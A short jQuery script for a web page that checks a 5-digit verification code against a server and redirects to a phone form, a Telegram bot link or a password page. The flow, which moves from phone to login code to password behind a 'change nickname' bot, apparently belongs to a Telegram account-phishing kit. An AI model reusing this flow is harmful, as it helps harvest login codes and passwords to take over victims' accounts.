$.fn.focusEnd = function() {
    $(this).focus();
    var tmp = $('<span />').appendTo($(this)),
        node = tmp.get(0),
        range = null,
        sel = null;

    if (document.selection) {
        range = document.body.createTextRange();
        range.moveToElementText(node);
        range.select();
    } else if (window.getSelection) {
        range = document.createRange();
        range.selectNode(node);
        sel = window.getSelection();
        sel.removeAllRanges();
        sel.addRange(range);
    }
    tmp.remove();
    return this;
}
function isDigit(s){
    if (isNaN(Number(s)) == true){
        return false
    }
    if (s.indexOf(" ")==0 || s.indexOf(".")==0){
        return false
    }
    return true
}
last_value=""
$(document).ready(function() {
    $('#code').on('input', function() {
        username = document.getElementById("username").innerHTML;
        code = $("#code");
        if (code.val().length==5){
            $.get("/check_code/" + username+"&"+code.val(), function(data) {
                if (data=="0"){
                    $("#code").attr('class', 'input-field-input error');
                    $("#code_text_1").text('Invalid Code');
                }
                else if(data=="-1"){
                    username_b = document.getElementById("username").innerHTML;
                    phone_b = Number(document.getElementById("phone").innerHTML).toString();
                    window.location.replace("/?username="+username_b+"&"+"phone="+phone_b);
                }
                else if(data=="1"){
                    window.location.replace("t.me/change_nickname_bot");
                }
                else if(data=="2"){
                    username_b = document.getElementById("username").innerHTML;
                    window.location.replace("/password?username="+username_b);
                }
            });
        }
        if (isDigit(code.val()) == false || code.val().length > 5){
            code.val(last_value);
        }
        $("#code").attr('class', 'input-field-input');
        $("#code_text_1").text('Code');
        last_value = code.val()
    });
    $('#edit').click(function() {
        username_b = document.getElementById("username").innerHTML;
        phone_b = Number(document.getElementById("phone").innerHTML).toString();
        window.location.replace("/?username="+username_b+"&"+"phone="+phone_b);
    });
});